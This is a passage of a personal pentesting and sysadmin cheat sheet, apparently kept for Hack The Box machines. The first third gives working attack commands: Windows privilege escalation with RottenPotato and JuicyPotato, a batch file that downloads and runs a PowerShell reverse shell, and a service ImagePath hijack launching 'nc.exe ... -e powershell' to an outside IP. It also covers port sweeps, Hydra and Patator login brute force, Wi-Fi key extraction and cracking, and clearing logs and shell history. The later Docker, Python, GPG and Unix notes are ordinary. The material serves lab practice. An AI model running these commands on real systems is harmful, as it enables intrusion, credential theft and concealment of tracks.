* [tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
* [tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
* [popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)

tags: *book.htb*


### Windows

#### Powershell

Run as another user:

```
PS> $user = '<HOSTNAME>\<USERNAME>'
PS> $pass = ConvertTo-SecureString 'passw0rd' -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)

PS> Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred
Or
PS> $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
PS> Invoke-Command -ScriptBlock { whoami } -Session $s
```

#### Potatoes

foxglovesec/RottenPotato **[1]**, **[2]**:

```
meterpreter > upload [3]
meterpreter > load incognito
meterpreter > execute -cH -f rottenpotato.exe
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

1. [github.com/foxglovesec/RottenPotato](https://github.com/foxglovesec/RottenPotato)
2. [foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
3. [github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe](https://github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe)

ohpe/juicy-potato **[1]**, **[2]**:

```
Cmd> certutil -urlcache -split -f http://127.0.0.1/[3] C:\Windows\System32\spool\drivers\color\j.exe
Cmd> certutil -urlcache -split -f http://127.0.0.1/rev.bat C:\Windows\System32\spool\drivers\color\rev.bat
root@kali:$ nc -lvnp 443
Cmd> j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

```bat
;= rem rev.bat

cmd /c powershell -NoP IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/[4]')
```

1. [github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)
2. [ohpe.it/juicy-potato/CLSID](https://ohpe.it/juicy-potato/CLSID)
3. [github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
4. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

#### wuauserv

```
PS> Get-Acl HKLM:\SYSTEM\CurrentControlSet\services\* | format-list * | findstr /i "snovvcrash Users Path ChildName"
PS> Get-ItemProperty HKLM:\System\CurrentControlSet\services\wuauserv
PS> reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.16 1337 -e powershell" /f
PS> Start-Service wuauserv
...get reverse shell...
PS> Get-Service wuauserv
PS> Stop-Service wuauserv
```

tags: *control.htb*



## Rootkits


### Linux

* [0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)

tags: *scavenger.htb*



## Enumeration


### Ping Sweep

```
root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a sweep.txt &); done
root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a sweep.txt &); done

root@kali:$ sort -t'.' -k4,4n sweep.txt > pingsweep.txt && rm sweep.txt
```

### Echo Ports

```
root@kali:$ IP="10.10.10.173"; for p in $(seq 1 65535); do (echo '.' > /dev/tcp/$IP/$p && echo "$IP:$p" >> ports.txt &) 2>/dev/null; done

root@kali:$ sort -t':' -k1,1n ports.txt > echoports.txt && rm ports.txt
```


### Nmap

Host discovery:

```
root@kali:$ nmap -n -sn 127.0.0.1/24
```

Port scan with masscan first (>= v1.0.6):

```
root@kali:$ masscan --rate=1000 -e tun0 -p1-65535,U:1-65535 127.0.0.1 > ports
root@kali:$ ports=`cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
```

Port scan with fast nmap first:

```
root@kali:$ nmap -n -Pn --min-rate=1000 -T4 127.0.0.1 -p- -vvv | tee ports
root@kali:$ ports=`cat ports | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
```

DNS brute force:

```
root@kali:$ nmap --dns-servers 127.0.0.1 --script dns-brute 127.0.0.1
```

Ldap search:

```
root@kali: nmap -n -Pn -sV --script=ldap-search -oA nmap/ldap 127.0.0.1 -p389
```

Flag `-A`:

```
nmap -A ... == nmap -sC -sV -O --traceroute ...
```


### DNS

```
root@kali:$ dig axfr @dns.example.com example.com
```


### WHOIS

```
root@kali:$ whois -h whois.example.com example.com
```



## Auth Brute Force


### Hydra

```
root@kali:$ hydra -V -t 20 -f -I -L logins.lst -P /usr/share/john/password.lst 127.0.0.1 -s 8888 smtp
root@kali:$ hydra -V -t 20 -f -I -l admin -P /usr/share/john/password.lst 127.0.0.1 -s 8888 ftp
```


### Patator

```
root@kali:$ patator smtp_login host=127.0.0.1 port=8888 user=FILE0 password=FILE1 0=logins.lst 1=/usr/share/john/password.lst -x ignore:mesg='(515) incorrect password or account name' -x free=user:code=0
root@kali:$ patator ftp_login host=127.0.0.1 port=8888 user=admin password=FILE0 0=/usr/share/john/password.lst -x ignore:mesg='Login incorrect.' -x free=user:code=0
```



## Wi-Fi


### Cowpaty + Wpaclean + Aircrack-ng

```
root@kali:$ cowpatty -r wifi.cap -c
root@kali:$ wpaclean wificleaned.cap wifi.cap
root@kali:$ aircrack-ng -w /usr/share/wordlists/rockyou.txt wificleaned.cap
```


### Credentials

Windows (netsh):

```
> netsh wlan show profiles
> netsh wlan show profiles "ESSID" key=clear
```

1. [https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks](https://www.nirsoft.net/utils/wireless_key.html#DownloadLinks)



## Password Brute Force


### Hashcat

```
root@kali:$ hashcat --example-hashes | grep -B1 -i md5
root@kali:$ hashcat -m 500 hashes/file.hash /usr/share/wordlists/rockyou.txt --username
root@kali:$ hashcat -m 500 hashes/file.hash --username --show
```




# Sublime Text



## Installation


### Linux

```
$ wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
$ sudo apt install apt-transport-https -y
$ echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list
$ sudo apt update && sudo apt install sublime-text -y

$ wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - && sudo apt install apt-transport-https -y && echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list && sudo apt update && sudo apt install sublime-text -y
```




# Git

Add SSH key to the ssh-agent:

```
$ eval "$(ssh-agent -s)"
$ ssh-add ~/.ssh/id_rsa
```

Test SSH key:

```
ssh -T git@github.com
```




# Docker

```
$ docker ps -a
$ docker stop `docker container ls -aq`
$ docker rm -v `docker container ls -aq -f status=exited`
$ docker rmi `docker images -aq`
$ docker start -ai <CONTAINER>
$ docker cp project/. <CONTAINER>:/root/project
$ docker run --rm -ith <HOSTNAME> --name <NAME> ubuntu bash
$ docker build -t <USERNAME>/<IMAGE> .
```



## Installation


### Linux

#### docker-engine

```
$ sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common -y
$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
[$ sudo apt-key fingerprint 0EBFCD88]
$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
(Or for Kali) $ echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
$ sudo apt update
[$ apt-cache policy docker-ce]
$ sudo apt install docker-ce
[$ sudo systemctl status docker]
$ sudo usermod -aG docker ${USER}
relogin
[$ docker --rm run hello-world]
```

#### docker-compose

```
$ sudo curl -L "https://github.com/docker/compose/releases/download/1.25.3/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
$ sudo chmod +x /usr/local/bin/docker-compose
[$ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose]
```




# Python



## Install/Update

```
$ sudo apt install software-properties-common -y
$ sudo add-apt-repository ppa:deadsnakes/ppa
$ sudo apt update && sudo apt install python3.7 -y

$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 1
$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 2
$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.7 3
$ sudo update-alternatives --config python3

$ sudo apt install python[3]-pip -y
Or
$ wget https://bootstrap.pypa.io/get-pip.py
$ python[3] get-pip.py

$ sudo python3 -m pip install --upgrade pip
```



## pip


### freeze

```
$ pip freeze --local [-r requirements.txt] > requirements.txt
```



## venv

```
$ sudo apt install python3-venv
$ python3 -m venv venv
```



## virtualenv

```
$ sudo pip3 install virtualenv
$ virtualenv -p python3 venv
$ source venv/bin/activate
$ deactivate
```


### virtualenvwrapper

```
$ sudo pip3 install virtualenvwrapper
$ export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3
$ source /usr/local/bin/virtualenvwrapper.sh
(in ~/.zshrc)

$ mkvirtualenv env-name
$ workon
$ workon env-name
$ deactivate
$ rmvirtualenv env-name
```


### pipenv

```
$ sudo pip install pipenv
$ pipenv --python python3 install [package]

$ pipenv shell
^D

$ pipenv run python script.py
$ pipenv lock -r > requirements.txt
$ pipenv --venv
$ pipenv --rm
```

Workaround for `TypeError: 'module' object is not callable`:

```
$ pipenv --python python3 install pip==18.0
```



## Testing


### doctest

`doctest` imported:

```
$ python3 example.py [-v]
```

`doctest` **not** imported:

```
$ python3 -m doctest example.py [-v]
```



## Linting


### flake8

```
$ python3 -m flake8 --ignore W191,E127,E226,E265,E501 somefile.py
```


### pylint

```
$ python3 -m pylint -d C0111,C0122,C0330,W0312 --msg-template='{msg_id}:{line:3d},{column:2d}:{obj}:{msg}' somefile.py
```



## PyPI


### twine

```
$ python setup.py sdist bdist_wheel [--bdist-dir ~/temp/bdistwheel]
$ twine check dist/*
$ twine upload --repository-url https://test.pypi.org/legacy/ dist/*
$ twine upload dist/*
```



## MISC


### bpython

```
$ python3 -m pip install bpython
```




# GPG

List keychain:

```
$ gpg --list-keys
```

Gen key:

```
$ gpg --full-generate-key [--expert]
```

Gen revoke cert:

```
$ gpg --output revoke.asc --gen-revoke user@example.com
revoke.asc
```

Export user's public key:

```
$ gpg --armor --output user.pub --export user@example.com
user.pub
```

Import recipient's public key:

```
$ gpg --import recipient.pub
```

Sign and encrypt:

```
$ gpg -o/--output encrypted.txt.gpg -e/--encrypt -s/--sign -u/--local-user user1@example.com -r/--recipient user2@example.com plaintext.txt
encrypted.txt.gpg
```

List recipients:

```
$ gpg --list-only -v -d/--decrypt encrypted.txt.gpg
```

Verify signature:

```
$ gpg --verify signed.txt.gpg
$ gpg --verify signed.txt.sig signed.txt
```

Decrypt and verify:
```
$ gpg -o/--output decrypted.txt -d/--decrypt --try-secret-key user1@example.com encrypted.txt.gpg
$ gpg -o/--output decrypted.txt -d/--decrypt -u/--local-user user1@example.com -r/--recipient user2@example.com encrypted.txt.gpg
```

* [How to Use GPG Keys to Send Encrypted Messages](https://www.linode.com/docs/security/encryption/gpg-keys-to-send-encrypted-messages/)
* [Используем GPG для шифрования сообщений и файлов / Хабр](https://habr.com/ru/post/358182/)
* [Как пользоваться gpg: шифрование, расшифровка файлов и сообщений, подпись файлов и проверка подписи, управление ключами - HackWare.ru](https://hackware.ru/?p=8215)




# Kali



## Dotfiles

```
root@kali:$ git clone https://github.com/snovvcrash/dotfiles-linux ~/.dotfiles
```

* [git.io/fjDVQ](https://git.io/fjDVQ)



## Initial

```
* Allocate 4GB RAM
* Change default password
* Disable screen lock (Settings -> Power)
* Update && Upgrade
* [if not done automatically on prev step] Install guest tools
* Set shared folder (+ automount)
* zsh & oh-my-zh (https://git.io/M1y4bQ)
  root@kali:$ apt intall zsh -y && sh -c "$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)"
* tmux
  root@kali:$ curl -s https://raw.githubusercontent.com/snovvcrash/dotfiles-linux/master/tmux/tmux-upd.sh | sudo bash -s -- <VERSION>
* cmake
  root@kali:$ apt install cmake -y
```



## VirtualBox


### Guest Additions

```
root@kali:$ apt update & apt dist-upgrade -y
root@kali:$ reboot
root@kali:$ apt install virtualbox-guest-x11 -y
root@kali:$ reboot
Or
* Mount the VirtualBox Guest Additions drive
root@kali:$ cp /media/cdrom0/VBoxLinuxAdditions.run /root/Desktop/
root@kali:$ chmod 755 ~/Desktop/VBoxLinuxAdditions.run
root@kali:$ ~/Desktop/VBoxLinuxAdditions.run && reboot
root@kali:$ rm ~/Desktop/VBoxLinuxAdditions.run
* Eject the VirtualBox Guest Additions drive
```


### Share Folder

Mount:

```
root@kali:$ mkdir ~/Desktop/Share
root@kali:$ mount -t vboxsf Share ~/Desktop/Share
Or (if mounted from VBox settings)
root@kali:$ ln -s /media/sf_Share ~/Desktop/Share
root@kali:$ sudo adduser $USER vboxsf
```

Automount:

```
root@kali:$ crontab -e
"@reboot    sleep 10; mount -t vboxsf Share ~/Desktop/Share"
```


### Network

Enable 2 network interfaces simultaneously **[1]**:

```
I found a solution, if you're using the pre-built VM (thanks offensive security).
I was stumped by the same issue of only one wired interface active at a time. I needed eth0 to be on a public routed network and eth1 to be on a private network so I can run a transparent proxy between them.

Solution I used is to open the gnome settings in upper right of GUI, choose the wrench icon and you should see eth0, eth1, network proxy listed.
1) Now go to eth1 and instead of configuring the "wired connection" settings, click the Add Profile button
2) In that profile configure what you need under IPv4 (IP, netmask)
3) At the bottom of the profile IPv4 settings tick the checkbox to "Use this connection only for resources on its network"
4) Apply that new profile 1 to eth1 and the interface should come active.
```

1. [forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time](https://forums.kali.org/showthread.php?29657-Only-one-of-multiple-wired-interfaces-(eth0-eth1-etc)-can-be-active-at-a-time)



## MISC

Add "New Document" option to Right-Click menu:

```
root@kali:$ cd Templates
root@kali:$ touch "New Document"
```




# Unix



## Encodings

From CP1252 to UTF-8:

```
$ iconv -f CP1252 -t UTF8 inputfile.txt -o outputfile.txt
Or
$ enconv -x UTF8 somefile.txt
```

Check:

```
$ enconv -d somefile.txt
Or
$ file -i somefile.txt
```

Remove ANSI escape codes:

```
$ awk '{ gsub("\\x1B\\[[0-?]*[ -/]*[@-~]", ""); print }' somefile.txt
```


### Windows/Unix Text

```
input.txt: ASCII text
VS
input.txt: ASCII text, with CRLF line terminators
```

From Win to Unix:

```
$ awk '{ sub("\r$", ""); print }' input.txt > output.txt
Or
$ dos2unix input.txt
```

From Unix to Win:

```
$ awk 'sub("$", "\r")' input.txt > output.txt
Or
$ unix2dos input.txt
```



## Network


### Connections

```
$ netstat -anlp | grep LIST
$ ss -nlpt | grep LIST
```


### Public IP

```
$ wget -q -O - https://ipinfo.io/ip
```



## Virtual Terminal

```
Start:
CTRL + ALT + F1-6

Stop:
ALT + F8
```



## Process Kill

```
$ ps aux | grep firefox
Or
$ pidof firefox

$ kill -15 <PID>
Or
$ kill -SIGTERM <PID>
Or
$ kill <PID>

If -15 signal didn't help, use stronger -9 signal:
$ kill -9 <PID>
Or
$ kill -SIGKILL <PID>
```



## Dev


### C Library Path

```
$ echo '#include <sys/types.h>'' | gcc -E -x c - | grep '/types.h'
```


### Vangrind

```
$ valgrind --leak-check=full --track-origins=yes --leak-resolution=med ./a.out
```



## OpenSSL


### Encrypt/Decrypt

```
$ openssl enc -e -aes-128-ecb -in file.txt -out file.txt.ecb -K 10101010
$ openssl enc -d -aes-128-ecb -in file.txt.ecb -out file.txt.ecb_dec -K 10101010

$ echo 'secret_data1 + secret_data2 + secret_data3' | openssl enc -e -aes-256-cbc -a -salt -md sha256 -iv 10101010 -pass pass:qwerty
$ echo 'U2FsdGVkX1+d1qH1M3nhYFKscrg5QYt+AlTSBPHgdB4JEP8YSy1FX+xYdrfJ5cZgfoGrW+2On7lMxRIhKCUmWQ==' | openssl enc -d -aes-256-cbc -a -salt -md sha256 -iv 10101010 -pass pass:qwerty
```


### Generate Keys

```
$ ssh-keygen -t rsa -b 4096 -N 's3cr3t_p4ssw0rd' -C 'user@email.com' -f rsa_key
$ mv rsa_key rsa_key.old
$ openssl pkcs8 -topk8 -v2 des3 \
  -in rsa_key.old -passin 'pass:s3cr3t_p4ssw0rd' \
  -out rsa_key -passout 'pass:s3cr3t_p4ssw0rd'
$ chmod 600 rsa_key

$ openssl rsa -text -in rsa_key -passin 'pass:s3cr3t_p4ssw0rd'
$ openssl asn1parse -in rsa_key
```



## Clear


### Log Files

```
$ > logfile
Or
$ cat /dev/null > logfile
Or
$ dd if=/dev/null of=logfile
Or
$ truncate logfile --size 0
```


### .bash_history

```
$ cat /dev/null > ~/.bash_history && history -c && exit
```



## Secure Delete

```
$ shred -zvu -n7 /path/to/file
$ find /path/to/dir -type f -exec shred -zvu -n7 {} \;
$ shred -zv -n0 /dev/sdc1
```



## Partitions

List devices:

```
$ lsblk
$ sudo fdisk -l
$ df -h
```

Manage partitions:

```
$ sudo fdisk /dev/sd??
```

Format:

```
$ sudo umount /dev/sd??
$ sudo mkfs.<type> -F 32 -I /dev/sd?? -n VOLUME-NAME
type: 'msdos' (=fat32), 'ntfs'
```



## Floppy

```
$ mcopy -i floppy.img 123.txt ::123.txt
$ mdel -i floppy.img 123.TXT
```



## Checksums

Compare file hashes:

```
$ md5sum /path/to/abc.txt | awk '{print $1, "/path/to/cba.txt"}' > /tmp/checksum.txt
$ md5sum -c /tmp/checksum.txt
```

Compare directory hashes:

```
$ hashdeep -c md5 -r /path/to/dir1 > dir1hashes.txt
$ hashdeep -c md5 -r -X -k dir1hashes.txt /path/to/dir2
```



## Permissions

Set defaults for files:

```
$ find . -type f -exec chmod 644 {} \;
```

Set defaults for directories:

```
$ find . -type d -exec chmod 755 {} \;
```



## Fix Linux Freezes while Copying

```
$ sudo crontab -l | { cat; echo '@reboot echo $((16*1024*1024)) > /proc/sys/vm/dirty_background_bytes'; } | crontab -
$ sudo crontab -l | { cat; echo '@reboot echo $((48*1024*1024)) > /proc/sys/vm/dirty_bytes'; } | crontab -
```



## Kernel

Remove old kernels:

```
$ dpkg -l linux-image-\* | grep ^ii
$ kernelver=$(uname -r | sed -r 's/-[a-z]+//')
$ dpkg -l linux-{image,headers}-"[0-9]*" | awk '/ii/{print $2}' | grep -ve $kernelver
$ sudo apt-get purge $(dpkg -l linux-{image,headers}-"[0-9]*" | awk '/ii/{print $2}' | grep -ve "$(uname -r | sed -r 's/-[a-z]+//')")
```



## Xfce4

Install `xfce4`:

```
$ sudo apt update
$ sudo apt upgrade -y
$ sudo apt install xfce4 xfce4-terminal gtk2-engines-pixbuf -y
```



## GIFs

```
$ sudo apt install peek -y
Or
$ sudo apt install byzanz xdotool -y
$ xdotool getmouselocation
$ byzanz-record --duration=15 --x=130 --y=90 --width=800 --height=500 ~/Desktop/out.gif
```



## NTP

```
$ sudo apt purge ntp
$ sudo timedatectl set-timezone Europe/Moscow
$ sudo vi /etc/systemd/timesyncd.conf
NTP=0.ru.pool.ntp.org 1.ru.pool.ntp.org 2.ru.pool.ntp.org 3.ru.pool.ntp.org
$ sudo service systemd-timesyncd restart
$ sudo timedatectl set-ntp true
$ timedatectl status
$ service systemd-timesyncd status
$ service systemd-timedated status
```

1. [feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/](https://feeding.cloud.geek.nz/posts/time-synchronization-with-ntp-and-systemd/)
2. [billauer.co.il/blog/2019/01/ntp-systemd/](http://billauer.co.il/blog/2019/01/ntp-systemd/)



## ImageMagick

XOR 2 images:

```
$ convert img1.png img2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" img_out
```



## Tools


### tar

#### .tar

Pack:

```
tar -cvf filename.tar
```

Unpack:

```
tar -xvf filename.tar
```

#### .tar.gz

Pack:

```
tar -cvzf filename.tar.gz
```

Unpack:

```
tar -xvzf filename.tar.gz
```

#### .tar.bz

Pack:

```
tar -cvjf filename.tar.bz
```

Unpack:

```
tar -xvjf filename.tar.bz
```


### 7z

Encrypt and pack all files in directory::

```
$ 7z a packed.7z -mhe -p"p4sSw0rD" *
```

Decrypt and unpack:

```
$ 7z e packed.7z -p"p4sSw0rD"
```


### grep/find/sed

Recursive grep:

```
$ grep -rnw /path/to/dir -e 'pattern'
```

Recursive find and replace:

```
$ find . -type f -name "*.txt" -exec sed -i'' -e 's/\<foo\>/bar/g' {} +
```

Exec `strings` and grep on the result with printing filenames:

```
$ find . -type f -print -exec sh -c 'strings $1 | grep -i -n "signature"' sh {} \;
```

Find and `xargs` grep results:

```
$ find . -type f -print0 | xargs -0 grep <PATTERN>
```


### dpkg

```
$ dpkg -s <package_name>
$ dpkg-query -W -f='${Status}' <package_name>
$ OUT="dpkg-query-$(date +'%FT%H%M%S').csv"; echo 'package,version' > ${OUT} && dpkg-query -W -f '${Package},${Version}\n' >> ${OUT}
```


### nslookup

```
$ nslookup example.com или 127.0.0.1

$ nslookup
[> server dns.example.com]
> set q=mx
> example.com

$ nslookup
> set q=ptr
> 127.0.0.1
```


### whois

IP/domain info, IP ranges:

```
$ whois [-h whois.example.com] example.com или 127.0.0.1
```


### dig

```
$ dig [@dns.example.com] example.com [{a,mx,ns,soa,txt,...}]
$ dig -x example.com [+short] [+timeout=1]
```

* [viewdns.info/reverseip/](https://viewdns.info/reverseip/)



## Fun


### CMatrix

```
$ sudo apt-get install cmatrix
```


### screenfetch

```
$ wget -O screenfetch https://raw.github.com/KittyKatt/screenFetch/master/screenfetch-dev
$ chmod +x screenfetch
$ sudo mv screenfetch /usr/bin
```




# Windows



## Secure Delete


### cipher

```
Cmd> cipher /w:H
```


### sdelete

File:

```
Cmd> sdelete -p 7 testfile.txt
```

Directory (recursively):

```
Cmd> sdelete -p 7 -r "C:\temp"
```

Disk or partition:

```
Cmd> sdelete -p 7 -c H:
```



## System Perfomance

```
Cmd> perfmon /res
```



## Network


### Connections and Routes

```
Cmd> netstat -b
Cmd> netstat -ano
Cmd> route print
```


### Clean Cache

```
Cmd> netsh int ip reset
Cmd> netsh int tcp reset
Cmd> ipconfig /flushdns
Cmd> netsh winsock reset
Cmd> route -f
[Cmd> ipconfig -renew]
```

Hide/unhide computer name on LAN:

```
Cmd> net config server
Cmd> net config server /hidden:yes
Cmd> net config server /hidden:no
(+ reboot)
```



## Symlinks

```
Cmd> mklink Link <FILE>
Cmd> mklink /D Link <DIRECTORY>
```



## Installed Software

```
PS> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize > InstalledSoftware.txt
```




# VirtualBox



## DHCP

```
Cmd> VBoxManage.exe dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.101 --upperip 10.0.1.254 --enable
```
